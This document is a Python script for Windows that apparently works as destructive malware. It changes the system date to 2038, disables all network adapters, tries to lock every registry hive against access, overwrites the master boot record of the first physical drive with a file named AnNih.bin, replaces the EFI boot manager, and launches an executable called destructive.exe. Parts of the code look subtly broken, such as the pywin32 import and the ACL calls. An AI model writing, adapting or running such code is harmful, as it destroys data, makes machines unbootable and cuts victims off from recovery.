import os
import subprocess
import psutil
import time
import threading
import winreg
import shutil
from datetime import datetime
from pywin32 import win32security, win32api, win32con
import win32file


# Function to change system date
def change_system_date():
    try:
        # Change the system date to 19th January 2038 (requires administrator privileges)
        date_str = "01-19-2038"
        subprocess.run(["cmd.exe", "/C", f"date {date_str}"], check=True, shell=True)
        print("System date changed to 19-01-2038.")
    except Exception as e:
        print(f"An error occurred while changing the system date: {e}")


# Function to get network adapters and disable them
def get_network_adapters():
    try:
        # Get the network interfaces using psutil
        adapters = psutil.net_if_addrs()
        interface_names = list(adapters.keys())
        print("Network adapters found:")
        for adapter in interface_names:
            print(adapter)
        return interface_names
    except Exception as e:
        print(f"An error occurred while getting network adapters: {e}")
        return []


def cut_network_connections(adapters):
    try:
        for adapter in adapters:
            subprocess.run(["netsh", "interface", "set", f"interface \"{adapter}\"", "admin=disable"], check=True)
            print(f"Network interface {adapter} disabled.")
    except Exception as e:
        print(f"An error occurred while cutting network connections: {e}")


# Function to lock registry hives (in Python, using winreg)
def lock_registry_hives():
    try:
        hives = [
            ("HKEY_CLASSES_ROOT", winreg.HKEY_CLASSES_ROOT),
            ("HKEY_CURRENT_USER", winreg.HKEY_CURRENT_USER),
            ("HKEY_LOCAL_MACHINE", winreg.HKEY_LOCAL_MACHINE),
            ("HKEY_USERS", winreg.HKEY_USERS),
            ("HKEY_CURRENT_CONFIG", winreg.HKEY_CURRENT_CONFIG)
        ]

        for hive_name, hive in hives:
            lock_registry_hive(hive_name, hive)
    except Exception as e:
        print(f"An error occurred while locking all registry hives: {e}")


def lock_registry_hive(hive_name, hive):
    try:
        # Open the registry hive key
        print(f"Locking registry hive: {hive_name}")
        key = winreg.OpenKey(hive, "", 0, winreg.KEY_WRITE)

        # Get security descriptor for the key
        sd = win32security.GetSecurityInfo(key, win32con.SE_REGISTRY_KEY, win32con.OWNER_SECURITY_INFORMATION |
                                           win32con.DACL_SECURITY_INFORMATION)

        # Create a DACL to apply on the registry key
        dacl = sd.GetSecurityDescriptorDacl()

        # Retrieve SID for LocalSystem and Builtin Administrators groups
        system_sid = win32security.ConvertSidToStringSid(win32security.LookupAccountName(None, "SYSTEM")[0])
        admins_sid = win32security.ConvertSidToStringSid(
            win32security.LookupAccountName(None, "BUILTIN\\Administrators")[0])

        # Add Allow permissions for SYSTEM and Administrators
        dacl.AddAccessAllowedAce(win32con.ACL_REVISION, win32con.KEY_ALL_ACCESS, system_sid)
        dacl.AddAccessAllowedAce(win32con.ACL_REVISION, win32con.KEY_ALL_ACCESS, admins_sid)

        # Deny all access for others by removing existing permissions
        dacl.AddAccessDeniedAce(win32con.ACL_REVISION, win32con.KEY_ALL_ACCESS, None)

        # Apply the modified DACL to the key
        win32security.SetSecurityInfo(key, win32con.SE_REGISTRY_KEY, win32con.DACL_SECURITY_INFORMATION, None, None,
                                      dacl, None)

        # Close the key
        winreg.CloseKey(key)

        print(f"Registry hive {hive_name} locked successfully.")
    except Exception as e:
        print(f"An error occurred while locking registry hive {hive_name}: {e}")


# Function to overwrite MBR using AnNih.bin
def overwrite_mbr(bin_file_path):
    try:
        # Check if the file exists
        if not os.path.exists(bin_file_path):
            print(f"Error: {bin_file_path} not found!")
            return

        # Open the disk (in this case, the first disk, '\\.\PhysicalDrive0')
        drive_path = r"\\.\PhysicalDrive0"
        drive = win32file.CreateFile(
            drive_path,
            win32file.GENERIC_WRITE,
            0,  # No sharing
            None,
            win32file.OPEN_EXISTING,
            0,
            None
        )

        # Open the binary file (AnNih.bin) to overwrite MBR
        with open(bin_file_path, 'rb') as bin_file:
            mbr_data = bin_file.read()

        # Write the binary data to the MBR (beginning of the drive)
        win32file.WriteFile(drive, mbr_data)

        # Close the drive
        win32file.CloseHandle(drive)

        print(f"MBR successfully overwritten using {bin_file_path}")
    except Exception as e:
        print(f"An error occurred while overwriting MBR: {e}")


# Function to copy bootmgfw.efi to the desired location
def copy_bootmgfw_efi():
    try:
        # Get the current working directory
        script_dir = os.getcwd()

        # Define the source path of bootmgfw.efi
        source_path = os.path.join(script_dir, "bootmgfw.efi")
        destination_path = r"X:\EFI\Microsoft\Boot\bootmgfw.efi"

        # Check if the source file exists
        if not os.path.exists(source_path):
            print(f"Source file {source_path} not found!")
            return

        # Create destination directory if it does not exist
        destination_dir = os.path.dirname(destination_path)
        if not os.path.exists(destination_dir):
            os.makedirs(destination_dir)

        # Copy the file
        shutil.copy2(source_path, destination_path)
        print(f"bootmgfw.efi copied successfully to {destination_path}")
    except Exception as e:
        print(f"An error occurred while copying bootmgfw.efi: {e}")


# Function to run destructive.exe
def run_destructive_exe():
    try:
        # Get the current working directory
        script_dir = os.getcwd()

        # Construct the full path to destructive.exe
        exe_path = os.path.join(script_dir, "destructive.exe")

        # Check if the executable exists
        if not os.path.exists(exe_path):
            print(f"Error: {exe_path} not found!")
            return

        # Run the executable
        subprocess.run([exe_path], check=True)
        print("destructive.exe executed successfully.")
    except Exception as e:
        print(f"An error occurred while running destructive.exe: {e}")


# Main function to run all tasks
def main():
    try:
        # Step 1: Change system date
        print("Changing system date to 19-01-2038...")
        change_system_date()

        # Step 2: Get network adapters and cut connections
        print("Getting network interfaces and cutting connections...")
        adapters = get_network_adapters()
        cut_network_connections(adapters)

        # Step 3: Lock registry hives
        print("Locking all registry hives...")
        lock_registry_hives()

        # Step 4: Overwrite MBR with AnNih.bin
        print("Overwriting MBR...")
        overwrite_mbr(os.path.join(os.getcwd(), "AnNih.bin"))

        # Step 5: Copy bootmgfw.efi
        print("Copying bootmgfw.efi...")
        copy_bootmgfw_efi()

        # Step 6: Run destructive.exe
        print("Running destructive.exe...")
        run_destructive_exe()

        print("All tasks completed successfully.")

    except Exception as e:
        print(f"An error occurred: {e}")


if __name__ == "__main__":
    main()
